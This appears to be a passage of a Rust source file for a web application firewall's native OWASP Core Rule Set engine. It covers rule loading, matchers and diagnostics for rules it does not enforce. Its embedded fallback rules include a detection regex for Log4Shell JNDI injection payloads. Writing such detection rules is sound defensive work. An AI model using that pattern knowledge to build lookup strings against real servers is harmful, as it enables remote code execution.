//! OWASP Core Rule Set (CRS) — native Rust implementation.
//!
//! Rules are loaded at runtime from the `rules/owasp-crs/` directory (YAML
//! files).  If the directory cannot be found, a minimal embedded rule set is
//! used as a fallback.
//!
//! Each rule has a `paranoia` level (1–4).  Only rules with
//! `paranoia <= defense_config.owasp_paranoia` are evaluated.
//! Default paranoia level is 1 (most permissive).
//!
//! # No silent failures
//!
//! A rule that cannot be evaluated by this engine is **never** loaded.  Both
//! the `field` and the `operator` are resolved to a concrete, implemented
//! matcher at load time; anything unresolvable is recorded in
//! [`LoadSummary`] and reported at `WARN` level on startup, and is excluded
//! from [`OWASPCheck::rule_count`].  Source-level failures (unreadable
//! directory, malformed YAML) are reported at `ERROR` level and recorded in
//! [`LoadSummary::source_errors`] — they never degrade silently into an empty
//! rule set.

use std::borrow::Cow;
use std::collections::{BTreeMap, HashMap};
use std::ffi::OsStr;
use std::fmt;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use regex::Regex;
use serde::Deserialize;
use tracing::{debug, error, info, warn};

use waf_common::{DetectionResult, Phase, RequestCtx};

use super::{Check, url_decode, url_decode_recursive};

/// Default on-disk location of the converted CRS rule set.
const DEFAULT_RULES_DIR: &str = "rules/owasp-crs";

/// Sub-directory of the rule set holding `pm_from_file` wordlists.
const DATA_SUBDIR: &str = "data";

/// Origin label used when rules come from an in-memory YAML string.
const INLINE_ORIGIN: &str = "<inline yaml>";

/// Origin label for the compiled-in fallback rule set.
const EMBEDDED_ORIGIN: &str = "<embedded fallback>";

// ── Minimal embedded fallback rules ──────────────────────────────────────────
// Used when the rules/owasp-crs/ directory cannot be found at runtime.

const EMBEDDED_RULES_YAML: &str = r#"
version: "1.0"
paranoia_level: 1
rules:
  - id: BUILTIN-911100
    name: Method is not allowed by policy
    category: protocol
    severity: critical
    paranoia: 1
    field: method
    operator: not_in
    value:
      - GET
      - POST
      - PUT
      - DELETE
      - PATCH
      - HEAD
      - OPTIONS
      - CONNECT
      - TRACE
    action: block

  - id: BUILTIN-920160
    name: Request body too large (>10 MB)
    category: protocol
    severity: critical
    paranoia: 1
    field: content_length
    operator: gt
    value: 10485760
    action: block

  - id: BUILTIN-944150
    name: 'Potential RCE: Log4j / Log4shell JNDI injection'
    category: java-injection
    severity: critical
    paranoia: 1
    field: all
    operator: regex
    value: '(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)'
    action: block
"#;

// ── YAML schema ───────────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct RuleSet {
    #[allow(dead_code)]
    #[serde(default)]
    version: String,
    #[allow(dead_code)]
    #[serde(default = "default_paranoia_level")]
    paranoia_level: u8,
    rules: Vec<YamlRule>,
}

const fn default_paranoia_level() -> u8 {
    1
}

#[derive(Debug, Deserialize)]
struct YamlRule {
    id: String,
    name: String,
    #[allow(dead_code)]
    #[serde(default)]
    category: String,
    #[allow(dead_code)]
    #[serde(default)]
    severity: String,
    paranoia: u8,
    field: String,
    operator: String,
    value: YamlValue,
    action: String,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum YamlValue {
    Str(String),
    List(Vec<String>),
    Int(i64),
}

// ── Load diagnostics ──────────────────────────────────────────────────────────

/// Coarse category of a rule rejection, used to aggregate startup diagnostics
/// and to reconcile "declared" against "enforced" rule counts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RejectCategory {
    /// The rule's `field` names a request location this engine cannot read.
    UnsupportedField,
    /// The rule's `operator` is not implemented by this engine.
    UnsupportedOperator,
    /// Field and operator are individually supported but their combination is
    /// not representable (a scalar comparison against a multi-valued
    /// collection).
    FieldOperatorMismatch,
    /// The rule's `value` has the wrong YAML type, is an invalid regex, or
    /// yields an empty pattern set.
    InvalidValue,
    /// A `pm_from_file` wordlist could not be located, read, or compiled.
    DataFile,
}

impl fmt::Display for RejectCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            Self::UnsupportedField => "unsupported-field",
            Self::UnsupportedOperator => "unsupported-operator",
            Self::FieldOperatorMismatch => "field-operator-mismatch",
            Self::InvalidValue => "invalid-value",
            Self::DataFile => "data-file",
        };
        f.write_str(s)
    }
}

/// Why a rule present in the source YAML was **not** compiled into an active
/// matcher.  Rejected rules are excluded from [`OWASPCheck::rule_count`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RejectReason {
    /// `field` is not one of the implemented request locations.
    UnsupportedField(String),
    /// `operator` is not one of the implemented matchers.
    UnsupportedOperator(String),
    /// A scalar operator (`equals` / `not_in` / `gt` / `lt`) was applied to a
    /// multi-valued field (`all` / `headers` / `cookies`).
    NonScalarField {
        /// The scalar operator that was requested.
        operator: String,
        /// The multi-valued field it was applied to.
        field: String,
    },
    /// `value` has the wrong YAML type for the operator.
    InvalidValueType {
        /// The operator that rejected the value.
        operator: String,
        /// Human-readable description of the expected YAML type.
        expected: &'static str,
    },
    /// `value` did not compile as a regular expression.
    InvalidRegex(String),
    /// The multi-pattern set derived from `value` is empty or would not build.
    PatternSet(String),
    /// A `pm_from_file` wordlist could not be loaded.
    DataFile {
        /// The wordlist file name as written in the rule.
        file: String,
        /// Underlying failure description.
        error: String,
    },
}

impl RejectReason {
    /// Coarse category used for aggregation and reporting.
    #[must_use]
    pub const fn category(&self) -> RejectCategory {
        match self {
            Self::UnsupportedField(_) => RejectCategory::UnsupportedField,
            Self::UnsupportedOperator(_) => RejectCategory::UnsupportedOperator,
            Self::NonScalarField { .. } => RejectCategory::FieldOperatorMismatch,
            Self::InvalidValueType { .. } | Self::InvalidRegex(_) | Self::PatternSet(_) => RejectCategory::InvalidValue,
            Self::DataFile { .. } => RejectCategory::DataFile,
        }
    }
}

impl fmt::Display for RejectReason {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedField(field) => {
                write!(f, "unsupported field '{field}' (no accessor implemented)")
            }
            Self::UnsupportedOperator(op) => {
                write!(f, "unsupported operator '{op}' (no matcher implemented)")
            }
            Self::NonScalarField { operator, field } => write!(
                f,
                "operator '{operator}' needs a single-valued field but '{field}' is a collection"
            ),
            Self::InvalidValueType { operator, expected } => {
                write!(f, "operator '{operator}' requires a {expected} value")
            }
            Self::InvalidRegex(err) => write!(f, "invalid regex: {err}"),
            Self::PatternSet(err) => write!(f, "unusable pattern set: {err}"),
            Self::DataFile { file, error } => {
                write!(f, "wordlist '{file}' unavailable: {error}")
            }
        }
    }
}

/// A rule that was declared in the source but is **not** enforced.
#[derive(Debug, Clone)]
pub struct RejectedRule {
    /// The rule's `id` field.
    pub rule_id: String,
    /// The file (or `<inline yaml>`) the rule was declared in.
    pub source: String,
    /// Why it was rejected.
    pub reason: RejectReason,
}

/// A whole rule source that could not be read or parsed.  Every rule it
/// declared is missing from the active set.
#[derive(Debug, Clone)]
pub struct SourceError {
    /// Path (or label) of the source.
    pub source: String,
    /// Underlying failure description.
    pub error: String,
}

/// Machine-readable account of a rule-set load.
///
/// This is the reconciliation basis for external conformance runs (`go-ftw`):
/// `attempted == compiled + rejected.len()` always holds for the sources that
/// parsed, and `source_errors` lists the sources whose rule count is unknown
/// because they never parsed.
#[derive(Debug, Clone, Default)]
pub struct LoadSummary {
    /// Rules successfully deserialised from all readable sources.
    pub attempted: usize,
    /// Rules that compiled into an enforceable matcher.
    pub compiled: usize,
    /// Rules that were declared but are not enforced, with the reason.
    pub rejected: Vec<RejectedRule>,
    /// Sources that failed to read/parse (their rules are entirely absent).
    pub source_errors: Vec<SourceError>,
    /// `true` when the minimal compiled-in rule set was used instead of the
    /// on-disk CRS.
    pub used_embedded_fallback: bool,
}

impl LoadSummary {
    /// Number of rejected rules in `category`.
    #[must_use]
    pub fn count(&self, category: RejectCategory) -> usize {
        self.rejected.iter().filter(|r| r.reason.category() == category).count()
    }

    /// Rule ids rejected in `category`, in declaration order.
    #[must_use]
    pub fn rule_ids(&self, category: RejectCategory) -> Vec<&str> {
        self.rejected
            .iter()
            .filter(|r| r.reason.category() == category)
            .map(|r| r.rule_id.as_str())
            .collect()
    }

    /// Rules dropped because their `field` is not implemented.
    #[must_use]
    pub fn rejected_field_count(&self) -> usize {
        self.count(RejectCategory::UnsupportedField)
    }

    /// Ids of the rules dropped because their `field` is not implemented.
    #[must_use]
    pub fn rejected_field_ids(&self) -> Vec<&str> {
        self.rule_ids(RejectCategory::UnsupportedField)
    }

    /// Rules dropped because their `operator` is not implemented.
    #[must_use]
    pub fn rejected_operator_count(&self) -> usize {
        self.count(RejectCategory::UnsupportedOperator)
    }

    /// Ids of the rules dropped because their `operator` is not implemented.
    #[must_use]
    pub fn rejected_operator_ids(&self) -> Vec<&str> {
        self.rule_ids(RejectCategory::UnsupportedOperator)
    }

    /// `true` when the active rule set is smaller than what the sources
    /// declared, or a source failed outright, or the embedded fallback was
    /// substituted.  Operators should treat this as "CRS coverage is not what
    /// the configuration implies".
    #[must_use]
    pub const fn is_degraded(&self) -> bool {
        !self.rejected.is_empty() || !self.source_errors.is_empty() || self.used_embedded_fallback
    }

    /// Emit the startup diagnostics for this load.
    ///
    /// Source failures are `ERROR` (a whole file's rules vanished); rejected
    /// rules are `WARN`, aggregated by reason with the full id list so an
    /// operator can see at a glance which rules are *declared but not
    /// enforced*.  A clean load logs a single `INFO` line.
    fn report(&self, origin: &str) {
        for err in &self.source_errors {
            error!(
                "OWASP CRS source '{}' failed to load ({}) — every rule it declares is NOT enforced",
                err.source, err.error
            );
        }

        if self.rejected.is_empty() {
            if self.source_errors.is_empty() {
                info!("OWASP CRS loaded {} rules from {origin}", self.compiled);
            } else {
                error!(
                    "OWASP CRS loaded {} rules from {origin} with {} unreadable source(s)",
                    self.compiled,
                    self.source_errors.len()
                );
            }
            return;
        }

        warn!(
            "OWASP CRS load summary for {origin}: {} of {} declared rules are ACTIVE — {} rejected \
             ({} unsupported-field, {} unsupported-operator, {} field-operator-mismatch, \
             {} invalid-value, {} data-file), {} unreadable source(s). Rejected rules are NOT enforced.",
            self.compiled,
            self.attempted,
            self.rejected.len(),
            self.count(RejectCategory::UnsupportedField),
            self.count(RejectCategory::UnsupportedOperator),
            self.count(RejectCategory::FieldOperatorMismatch),
            self.count(RejectCategory::InvalidValue),
            self.count(RejectCategory::DataFile),
            self.source_errors.len(),
        );

        // Aggregate by (category, rendered reason) so identical causes collapse
        // into one line carrying every affected rule id.
        let mut groups: BTreeMap<(RejectCategory, String), Vec<&str>> = BTreeMap::new();
        for rejected in &self.rejected {
            groups
                .entry((rejected.reason.category(), rejected.reason.to_string()))
                .or_default()
                .push(rejected.rule_id.as_str());
        }
        for ((category, reason), ids) in groups {
            warn!(
                "OWASP CRS [{category}] {} rule(s) NOT enforced — {reason}: {}",
                ids.len(),
                ids.join(", ")
            );
        }
    }
}

// ── Request fields ────────────────────────────────────────────────────────────

/// A request location a CRS rule can be evaluated against.
///
/// Every variant is backed by a real accessor, so a rule that compiles is
/// guaranteed to be evaluable.  Unknown names are rejected at load time
/// ([`RejectReason::UnsupportedField`]) rather than silently never matching.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Field {
    /// Path, query, request body and every request header value.
    All,
    Method,
    Path,
    Query,
    /// Request body preview (lossy UTF-8).
    Body,
    ContentLength,
    ContentType,
    UserAgent,
    PathLength,
    QueryArgCount,
    /// Every request header — names *and* values.
    ///
    /// This deliberately differs from [`super::SCANNED_HEADERS`], the curated
    /// 7-header list used by the heuristic SQLi/XSS/RCE checks to bound false
    /// positives.  CRS `headers` rules derive from
    /// `REQUEST_HEADERS_NAMES|REQUEST_HEADERS`, whose semantics are "all
    /// headers"; narrowing them to the curated list would silently weaken the
    /// rule (e.g. CRS-921140 header-injection detection).
    Headers,
    /// Each individual cookie **value** (CRS `REQUEST_COOKIES`).
    ///
    /// Split per-cookie rather than matching the whole `Cookie` header,
    /// because CRS cookie rules count characters *within one cookie value*;
    /// running them over the concatenated header would fire on any request
    /// carrying several ordinary cookies.
    Cookies,
    HeaderReferer,
    HeaderHost,
    HeaderRange,
}

impl Field {
    fn parse(name: &str) -> Option<Self> {
        Some(match name {
            "all" => Self::All,
            "method" => Self::Method,
            "path" => Self::Path,
            "query" => Self::Query,
            "body" => Self::Body,
            "content_length" => Self::ContentLength,
            "content_type" | "header_content_type" => Self::ContentType,
            "user_agent" | "header_user_agent" => Self::UserAgent,
            "path_length" => Self::PathLength,
            "query_arg_count" => Self::QueryArgCount,
            "headers" => Self::Headers,
            "cookies" => Self::Cookies,
            "header_referer" => Self::HeaderReferer,
            "header_host" => Self::HeaderHost,
            "header_range" => Self::HeaderRange,
            _ => return None,
        })
    }

    /// `false` for fields that expand to several values; scalar comparisons
    /// (`equals` / `not_in` / `gt` / `lt`) are not meaningful on those.
    const fn is_scalar(self) -> bool {
        !matches!(self, Self::All | Self::Headers | Self::Cookies)
    }

    /// The single value of a scalar field, or `None` for multi-valued fields
    /// and for scalar fields absent from the request.
    fn scalar(self, ctx: &RequestCtx) -> Option<Cow<'_, str>> {
        let header = |name: &str| ctx.headers.get(name).map(|v| Cow::Borrowed(v.as_str()));
        match self {
            Self::Method => Some(Cow::Borrowed(ctx.method.as_str())),
            Self::Path => Some(Cow::Borrowed(ctx.path.as_str())),
            Self::Query => Some(Cow::Borrowed(ctx.query.as_str())),
            Self::Body => Some(String::from_utf8_lossy(&ctx.body_preview)),
            Self::ContentLength => Some(Cow::Owned(ctx.content_length.to_string())),
            Self::ContentType => header("content-type"),
            Self::UserAgent => header("user-agent"),
            Self::HeaderReferer => header("referer"),
            // The raw `Host` request header, *not* the matched vhost name —
            // CRS-920350 exists precisely to flag a Host header the site
            // configuration would not have produced.
            Self::HeaderHost => header("host"),
            Self::HeaderRange => header("range"),
            Self::PathLength => Some(Cow::Owned(ctx.path.len().to_string())),
            Self::QueryArgCount => {
                let count = ctx.query.split('&').filter(|s| !s.is_empty()).count();
                Some(Cow::Owned(count.to_string()))
            }
            Self::All | Self::Headers | Self::Cookies => None,
        }
    }

    /// Apply `f` to every value this field expands to, short-circuiting on the
    /// first `true`.
    fn any_value(self, ctx: &RequestCtx, mut f: impl FnMut(&str) -> bool) -> bool {
        match self {
            Self::All => {
                f(&ctx.path)
                    || f(&ctx.query)
                    || f(&String::from_utf8_lossy(&ctx.body_preview))
                    || ctx.headers.values().any(|v| f(v))
            }
            Self::Headers => ctx.headers.iter().any(|(name, value)| f(name) || f(value)),
            Self::Cookies => cookie_values(ctx).any(&mut f),
            _ => self.scalar(ctx).as_deref().is_some_and(&mut f),
        }
    }
}

/// Individual cookie values from the folded `Cookie` header.
fn cookie_values(ctx: &RequestCtx) -> impl Iterator<Item = &str> + '_ {
    ctx.headers
        .get("cookie")
        .into_iter()
        .flat_map(|raw| raw.split(';'))
        .map(|pair| {
            let pair = pair.trim();
            pair.split_once('=').map_or(pair, |(_, value)| value)
        })
        .filter(|value| !value.is_empty())
}

/// Apply `f` to `raw` and, when `raw` looks percent/plus-encoded, to its
/// single- and recursively-decoded forms.
///
/// CRS attaches `t:urlDecodeUni` to its `@pm` / `@pmFromFile` rules, so phrase
/// matching must see the decoded text.  The cheap "contains `%` or `+`" guard
/// keeps the common (unencoded) case allocation-free.
fn any_decoded_form(raw: &str, mut f: impl FnMut(&str) -> bool) -> bool {
    if f(raw) {
        return true;
    }
    if !raw.bytes().any(|b| b == b'%' || b == b'+') {
        return false;
    }
    let decoded = url_decode(raw);
    if decoded != raw && f(&decoded) {
        return true;
    }
    let recursive = url_decode_recursive(raw);
    recursive != decoded && f(&recursive)
}

// ── Compiled rule ─────────────────────────────────────────────────────────────

enum CompiledMatcher {
    Regex(Regex),
    Contains(String),
    /// Case-sensitive exact comparison (`ModSecurity` `@streq`).
    Equals(String),
    NotIn(Vec<String>),
    Gt(i64),
    Lt(i64),
    /// Aho-Corasick phrase set — backs `contains_any` (`@pm`) and
    /// `pm_from_file` (`@pmFromFile`).  Shared so several rules referencing
    /// the same wordlist compile the automaton once.
    MultiPattern(Arc<AhoCorasick>),
    /// libinjection SQL injection detection (CRS-942100 etc.)
    DetectSqli,
    /// libinjection XSS detection (CRS-941100 etc.)
    DetectXss,
}

struct CompiledRule {
    id: String,
    name: String,
    paranoia: u8,
    field: Field,
    matcher: CompiledMatcher,
    #[allow(dead_code)]
    action: String,
}

impl CompiledRule {
    fn matches(&self, ctx: &RequestCtx) -> bool {
        match &self.matcher {
            CompiledMatcher::Regex(re) => self.field.any_value(ctx, |v| re.is_match(v)),
            CompiledMatcher::Contains(needle) => self.field.any_value(ctx, |v| v.contains(needle.as_str())),
            CompiledMatcher::MultiPattern(ac) => self
                .field
                .any_value(ctx, |v| any_decoded_form(v, |decoded| ac.is_match(decoded))),
            CompiledMatcher::Equals(target) => self.field.scalar(ctx).is_some_and(|v| v.as_ref() == target.as_str()),
            CompiledMatcher::NotIn(list) => self
                .field
                .scalar(ctx)
                .is_some_and(|v| !list.iter().any(|allowed| allowed.eq_ignore_ascii_case(v.as_ref()))),
            CompiledMatcher::Gt(n) => self
                .field
                .scalar(ctx)
                .and_then(|v| v.parse::<i64>().ok())
                .is_some_and(|v| v > *n),
            CompiledMatcher::Lt(n) => self
                .field
                .scalar(ctx)
                .and_then(|v| v.parse::<i64>().ok())
                .is_some_and(|v| v < *n),
            CompiledMatcher::DetectSqli => {
                self.detect_injection(ctx, |input| libinjectionrs::detect_sqli(input).is_injection())
            }
            CompiledMatcher::DetectXss => {
                self.detect_injection(ctx, |input| libinjectionrs::detect_xss(input).is_injection())
            }
        }
    }

    /// Run a libinjection detector against the appropriate request fields.
    ///
    /// For the `all` field, scans path, query, body, and header values
    /// (matching CRS behavior for libinjection rules).  Each value is tested
    /// in raw form, single-decoded form, and recursively-decoded form (up to
    /// [`super::MAX_DECODE_PASSES`] passes, currently 5) to catch `%`-encoded
    /// and double/triple-encoded evasion attempts.
    /// For any other field, every value it expands to is tested in all three
    /// forms.
    fn detect_injection(&self, ctx: &RequestCtx, detector: impl Fn(&[u8]) -> bool) -> bool {
        // Helper: test raw, single-decoded, and recursively-decoded forms.
        let detect_with_decode = |raw: &str| -> bool {
            if detector(raw.as_bytes()) {
                return true;
            }
            let decoded = url_decode(raw);
            if decoded != raw && detector(decoded.as_bytes()) {
                return true;
            }
            let recursive = url_decode_recursive(raw);
            recursive != decoded && detector(recursive.as_bytes())
        };

        if self.field == Field::All {
            // The raw byte body is additionally tested unmodified, because the
            // lossy UTF-8 conversion can destroy a binary payload.
            return detect_with_decode(&ctx.path)
                || detect_with_decode(&ctx.query)
                || detector(&ctx.body_preview)
                || detect_with_decode(&String::from_utf8_lossy(&ctx.body_preview))
                || ctx.headers.values().any(|v| detect_with_decode(v));
        }
        self.field.any_value(ctx, detect_with_decode)
    }
}

// ── Loader ────────────────────────────────────────────────────────────────────

/// Wordlist load outcome, cached per file name so a failure is reported the
/// same way for every rule referencing it and a success is compiled once.
type WordlistResult = Result<Arc<AhoCorasick>, String>;

struct Loader {
    rules: Vec<CompiledRule>,
    summary: LoadSummary,
    /// Directory holding `pm_from_file` wordlists; `None` when the rules did
    /// not come from a directory (in that case `pm_from_file` is rejected
    /// rather than silently skipped).
    data_dir: Option<PathBuf>,
    wordlists: HashMap<String, WordlistResult>,
}

impl Loader {
    fn new(data_dir: Option<PathBuf>) -> Self {
        Self {
            rules: Vec::new(),
            summary: LoadSummary::default(),
            data_dir,
            wordlists: HashMap::new(),
        }
    }

    fn push_source_error(&mut self, source: String, error: String) {
        self.summary.source_errors.push(SourceError { source, error });
    }

    fn add_source(&mut self, source: &str, content: &str) {
        let ruleset: RuleSet = match serde_yaml::from_str(content) {
            Ok(parsed) => parsed,
            Err(e) => {
                self.push_source_error(source.to_owned(), e.to_string());
                return;
            }
        };

        for rule in ruleset.rules {
            self.summary.attempted = self.summary.attempted.saturating_add(1);
            let rule_id = rule.id.clone();
            match self.compile(rule) {
                Ok(compiled) => self.rules.push(compiled),
                Err(reason) => self.summary.rejected.push(RejectedRule {
                    rule_id,
                    source: source.to_owned(),
                    reason,
                }),
            }
        }
        self.summary.compiled = self.rules.len();
    }

    fn compile(&mut self, rule: YamlRule) -> Result<CompiledRule, RejectReason> {
        // Validate the field *before* the operator: an unreadable field makes
        // the rule unenforceable no matter which matcher it asks for.
        let field = Field::parse(&rule.field).ok_or_else(|| RejectReason::UnsupportedField(rule.field.clone()))?;

        let op = rule.operator.as_str();
        if matches!(op, "equals" | "not_in" | "gt" | "lt") && !field.is_scalar() {
            return Err(RejectReason::NonScalarField {
                operator: op.to_owned(),
                field: rule.field.clone(),
            });
        }

        let matcher = match op {
            "regex" => {
                let pattern = str_value(&rule.value, op)?;
                Regex::new(pattern)
                    .map(CompiledMatcher::Regex)
                    .map_err(|e| RejectReason::InvalidRegex(e.to_string()))?
            }
            "contains" => CompiledMatcher::Contains(str_value(&rule.value, op)?.to_owned()),
            "equals" => CompiledMatcher::Equals(str_value(&rule.value, op)?.to_owned()),
            "contains_any" => CompiledMatcher::MultiPattern(build_phrase_set(&rule.value, op)?),
            "pm_from_file" => {
                let file = str_value(&rule.value, op)?;
                CompiledMatcher::MultiPattern(self.wordlist(file)?)
            }
            "not_in" => {
                let YamlValue::List(list) = &rule.value else {
                    return Err(RejectReason::InvalidValueType {
                        operator: op.to_owned(),
                        expected: "list of strings",
                    });
                };
                CompiledMatcher::NotIn(list.clone())
            }
            "gt" => CompiledMatcher::Gt(int_value(&rule.value, op)?),
            "lt" => CompiledMatcher::Lt(int_value(&rule.value, op)?),
            "detect_sqli" | "@detectSQLi" => CompiledMatcher::DetectSqli,
            "detect_xss" | "@detectXSS" => CompiledMatcher::DetectXss,
            other => return Err(RejectReason::UnsupportedOperator(other.to_owned())),
        };

        Ok(CompiledRule {
            id: rule.id,
            name: rule.name,
            paranoia: rule.paranoia,
            field,
            matcher,
            action: rule.action,
        })
    }

    /// Resolve a `pm_from_file` wordlist to a shared automaton.
    fn wordlist(&mut self, file: &str) -> Result<Arc<AhoCorasick>, RejectReason> {
        let reject = |error: String| RejectReason::DataFile {
            file: file.to_owned(),
            error,
        };

        // The name comes from a YAML file on disk: keep it a plain file name so
        // a rule can never reach outside the rule set's data directory.
        if file.is_empty() || file.contains('/') || file.contains('\\') || file.contains("..") {
            return Err(reject("not a plain file name".to_owned()));
        }

        if let Some(cached) = self.wordlists.get(file) {
            return cached.clone().map_err(reject);
        }

        let Some(dir) = self.data_dir.as_ref() else {
            return Err(reject("this rule source has no associated data directory".to_owned()));
        };

        let outcome = build_wordlist(&dir.join(file));
        self.wordlists.insert(file.to_owned(), outcome.clone());
        outcome.map_err(reject)
    }

    fn finish(self, origin: &str) -> OWASPCheck {
        self.summary.report(origin);
        OWASPCheck {
            rules: self.rules,
            summary: self.summary,
        }
    }
}

fn str_value<'a>(value: &'a YamlValue, operator: &str) -> Result<&'a str, RejectReason> {
    match value {
        YamlValue::Str(s) => Ok(s.as_str()),
        YamlValue::List(_) | YamlValue::Int(_) => Err(RejectReason::InvalidValueType {
            operator: operator.to_owned(),
            expected: "string",
        }),
    }
}

fn int_value(value: &YamlValue, operator: &str) -> Result<i64, RejectReason> {
    match value {
        YamlValue::Int(n) => Ok(*n),
        YamlValue::Str(_) | YamlValue::List(_) => Err(RejectReason::InvalidValueType {
            operator: operator.to_owned(),
            expected: "integer",
        }),
    }
}

/// Build the Aho-Corasick automaton for a `contains_any` (`@pm`) phrase set.
///
/// Accepts the CRS form (one whitespace-separated string of phrases) and a
/// YAML list of phrases.
fn build_phrase_set(value: &YamlValue, operator: &str) -> Result<Arc<AhoCorasick>, RejectReason> {
    let phrases: Vec<&str> = match value {
        YamlValue::Str(s) => s.split_whitespace().collect(),
        YamlValue::List(list) => list.iter().map(String::as_str).filter(|s| !s.is_empty()).collect(),
        YamlValue::Int(_) => {
            return Err(RejectReason::InvalidValueType {
                operator: operator.to_owned(),
                expected: "string or list of strings",
            });
        }
    };
    if phrases.is_empty() {
        return Err(RejectReason::PatternSet("no phrases".to_owned()));
    }
    build_automaton(&phrases).map_err(RejectReason::PatternSet)
}

/// Read a CRS `.data` wordlist and compile it into an automaton.
///
/// Blank lines and `#` comments are skipped and every entry is trimmed, which
/// is how `ModSecurity` reads `@pmFromFile` lists.
fn build_wordlist(path: &Path) -> WordlistResult {
    let content = std::fs::read_to_string(path).map_err(|e| format!("cannot read {}: {e}", path.display()))?;
    let patterns: Vec<&str> = content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .collect();
    if patterns.is_empty() {
        return Err(format!("{} contains no usable patterns", path.display()));
    }
    debug!("OWASP CRS wordlist {} → {} patterns", path.display(), patterns.len());
    build_automaton(&patterns).map_err(|e| format!("{}: {e}", path.display()))
}

/// `MatchKind::Standard` is used because callers only need "does any phrase
/// occur"; ASCII case-insensitivity mirrors CRS's `t:lowercase` transform.
fn build_automaton(patterns: &[&str]) -> Result<Arc<AhoCorasick>, String> {
    AhoCorasickBuilder::new()
        .match_kind(MatchKind::Standard)
        .ascii_case_insensitive(true)
        .build(patterns)
        .map(Arc::new)
        .map_err(|e| e.to_string())
}

// ── OWASPCheck ────────────────────────────────────────────────────────────────

/// WAF checker implementing a subset of the `OWASP` CRS.
pub struct OWASPCheck {
    rules: Vec<CompiledRule>,
    summary: LoadSummary,
}

impl OWASPCheck {
    /// Create by loading rules from `rules/owasp-crs/` relative to the
    /// current working directory.
    ///
    /// # Degradation policy
    ///
    /// The check is one of ~18 detection phases in front of customer traffic,
    /// and this constructor is infallible by construction (the engine builds
    /// it during startup wiring), so a broken rule set must not translate into
    /// "block every request" — that would turn a configuration defect into a
    /// total outage while the other phases still work.  Instead the load is
    /// *loud*: unreadable sources are `ERROR`, rejected rules are `WARN` with
    /// their ids, and [`LoadSummary::is_degraded`] exposes the state for
    /// health reporting.  When the directory yields zero enforceable rules the
    /// minimal embedded set is substituted (strictly better than none) and the
    /// substitution is logged at `ERROR` and recorded in the summary.
    pub fn new() -> Self {
        let dir = Path::new(DEFAULT_RULES_DIR);
        if !dir.is_dir() {
            warn!(
                "{DEFAULT_RULES_DIR}/ not found; using the minimal embedded OWASP rule set — \
                 full CRS coverage is NOT active"
            );
            return Self::embedded_fallback(LoadSummary::default());
        }

        let loaded = Self::from_directory(dir);
        if loaded.rule_count() > 0 {
            return loaded;
        }

        error!(
            "{DEFAULT_RULES_DIR}/ exists but produced 0 enforceable rules ({} declared, {} rejected, \
             {} unreadable source(s)); substituting the minimal embedded rule set — CRS coverage is effectively OFF",
            loaded.summary.attempted,
            loaded.summary.rejected.len(),
            loaded.summary.source_errors.len()
        );
        Self::embedded_fallback(loaded.summary)
    }

    /// Compile the embedded rule set, carrying `prior` diagnostics forward so
    /// the failed on-disk attempt stays visible in [`Self::load_summary`].
    fn embedded_fallback(prior: LoadSummary) -> Self {
        let mut check = Self::from_yaml_at(EMBEDDED_RULES_YAML, EMBEDDED_ORIGIN, None);
        check.summary.used_embedded_fallback = true;
        check.summary.attempted = check.summary.attempted.saturating_add(prior.attempted);
        check.summary.rejected.extend(prior.rejected);
        check.summary.source_errors.extend(prior.source_errors);
        check
    }

    /// Load all `.yaml` files from a directory, merging their rule lists.
    ///
    /// `pm_from_file` wordlists are resolved against `<dir>/data/`.  Files are
    /// visited in sorted order so first-match rule precedence does not depend
    /// on filesystem iteration order.
    pub fn from_directory(dir: &Path) -> Self {
        let mut loader = Loader::new(Some(dir.join(DATA_SUBDIR)));

        match std::fs::read_dir(dir) {
            Ok(entries) => {
                let mut paths: Vec<PathBuf> = entries
                    .flatten()
                    .map(|entry| entry.path())
                    .filter(|path| path.extension().and_then(OsStr::to_str) == Some("yaml"))
                    .collect();
                paths.sort();
                for path in paths {
                    let label = path.display().to_string();
                    match std::fs::read_to_string(&path) {
                        Ok(content) => loader.add_source(&label, &content),
                        Err(e) => loader.push_source_error(label, e.to_string()),
                    }
                }
            }
            Err(err) => loader.push_source_error(dir.display().to_string(), err.to_string()),
        }

        loader.finish(&dir.display().to_string())
    }

    /// Create from a YAML string (single-document, `RuleSet` format).
    ///
    /// `pm_from_file` rules are rejected (no data directory is associated with
    /// an in-memory source); use [`Self::from_yaml_with_data_dir`] to supply
    /// one.
    pub fn from_yaml(yaml: &str) -> Self {
        Self::from_yaml_at(yaml, INLINE_ORIGIN, None)
    }

    /// Like [`Self::from_yaml`], but resolves `pm_from_file` wordlists against
    /// `data_dir`.
    pub fn from_yaml_with_data_dir(yaml: &str, data_dir: &Path) -> Self {
        Self::from_yaml_at(yaml, INLINE_ORIGIN, Some(data_dir.to_path_buf()))
    }

    fn from_yaml_at(yaml: &str, origin: &str, data_dir: Option<PathBuf>) -> Self {
        let mut loader = Loader::new(data_dir);
        loader.add_source(origin, yaml);
        loader.finish(origin)
    }

    /// Try to load from a single YAML file, falling back to defaults on error.
    pub fn from_file_or_default(path: &Path) -> Self {
        match std::fs::read_to_string(path) {
            Ok(content) => {
                debug!("Loading OWASP rules from {}", path.display());
                Self::from_yaml_at(
                    &content,
                    &path.display().to_string(),
                    path.parent().map(Path::to_path_buf),
                )
            }
            Err(e) => {
                warn!(
                    "Cannot read OWASP rule file {} ({e}); falling back to the default rule set",
                    path.display()
                );
                Self::new()
            }
        }
    }

    /// Number of rules that are actually enforced.  Rules declared in the
    /// source but rejected at load time are **not** counted.
    pub const fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Full account of the last load — declared vs. enforced counts, rejection
    /// reasons and affected rule ids, and unreadable sources.
    pub const fn load_summary(&self) -> &LoadSummary {
